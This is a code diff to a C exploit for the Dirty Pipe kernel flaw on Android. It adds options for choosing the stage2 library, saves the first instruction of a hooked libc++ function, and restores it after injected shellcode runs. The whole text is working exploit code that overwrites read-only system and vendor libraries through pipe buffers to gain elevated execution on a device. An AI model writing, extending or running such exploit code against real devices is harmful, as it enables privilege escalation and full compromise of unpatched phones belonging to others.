@@ -50,6 +50,10 @@ extern char stage1_start[];
 extern char stage1_data[];
 extern uint32_t stage1_len;
 extern char stage1_filename[];
+extern char stage1_stage2_libname[];
+extern char stage1_first_inst_copy[];
+
+#define STAGE1_STAGE2_LIBNAME_LEN 64
 
 #define STAGE2_PAGES (1 + 1 + 4)
 extern char stage2_payload[];
@@ -58,7 +62,8 @@ extern char stage2_payload[];
 #define PAGE_SIZE 4096
 #endif
 
-int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target);
+int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target
+		, uint32_t* first_instruction);
 
 /**
  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
@@ -188,6 +193,7 @@ int main(int argc, char **argv)
 	size_t data_size;
 	uint64_t shellcode_offset = 0;
 	uint64_t hook_offset = 0;
+	uint32_t first_instruction = 0;
 
 	char product[PROP_VALUE_MAX] = {};
 	char fingerprint[PROP_VALUE_MAX] = {};
@@ -200,6 +206,9 @@ int main(int argc, char **argv)
 			stage2_param_libname = argv[2];
 		}else{
 			stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
+		}
+		if(argc >= 4){
+			stage2_lib = argv[3];
 		}
 	}else{
 		if(strcmp(product, "oriole") == 0){
@@ -219,13 +228,19 @@ int main(int argc, char **argv)
 		}
 	}
 	printf("Device version: Product=%s Fingerprint=%s\n", product, fingerprint);
-	printf("Stage2 libname for kmod overwrite: %s\n", stage2_param_libname);
+	printf("stage1_lib: %s\n", stage1_lib);
+	printf("stage2_lib: %s\n", stage2_lib);
+	printf("stage2_param_libname: %s\n", stage2_param_libname);
+	if(strlen(stage2_lib) >= STAGE1_STAGE2_LIBNAME_LEN){
+		fprintf(stderr, "Too long stage2_lib\n");
+		return EXIT_FAILURE;
+	}
 
-	if(find_hook_target(stage1_lib, &hook_offset, &shellcode_offset)){
+	if(find_hook_target(stage1_lib, &hook_offset, &shellcode_offset, &first_instruction)){
 		fprintf(stderr, "Could not find hook target and shellcode offset from libc++.so\n");
 		return EXIT_FAILURE;
 	}
-	printf("Offset found: shellcode_offset: %lx hook_offset: %lx\n", shellcode_offset, hook_offset);
+	printf("Offset found: shellcode_offset: %lx hook_offset: %lx first instruction: %08x\n", shellcode_offset, hook_offset, first_instruction);
 
 	uint64_t empty_space = (PAGE_SIZE - (shellcode_offset % PAGE_SIZE)) % PAGE_SIZE;
 	printf("Empty space size: %ld bytes\n", empty_space);
@@ -254,11 +269,15 @@ int main(int argc, char **argv)
 	int hook_data_size = 4;
 
 	sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
+	printf("Stage1 debug filename: %s\n", stage1_filename);
+	strcpy(stage1_stage2_libname, stage2_lib);
 
 	// Jump back to hook target + 4.
 	uint32_t jmpback = BRANCH;
 	jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
 	*(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;
+
+	*(uint32_t *)&stage1_first_inst_copy[0] = first_instruction;
 
 	printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
 
@@ -293,14 +312,6 @@ int main(int argc, char **argv)
 	}
 	if(read(fd1, stage1_backup, stage1_len) < 0){
 		perror("read backup stage1");
-	}
-
-	if(lseek64(fd1, hook_offset, SEEK_SET) < 0){
-		perror("lseek64");
-	}
-	uint32_t hook_backup = 0;
-	if(read(fd1, &hook_backup, hook_data_size) < 0){
-		perror("read backup hook");
 	}
 
 	/* create the pipe with all flags initialized with
@@ -344,7 +355,7 @@ int main(int argc, char **argv)
 		int ret = sigwait(&set, &sig);
 
 		// Restore stage1
-		overwrite(p, fd1, hook_offset, (char*)&hook_backup, hook_data_size);
+		overwrite(p, fd1, hook_offset, (char*)&first_instruction, hook_data_size);
 		overwrite(p, fd1, shellcode_offset, stage1_backup, stage1_len);
 		// Restore stage2
 		for(int i = 0; i < STAGE2_PAGES; i++){
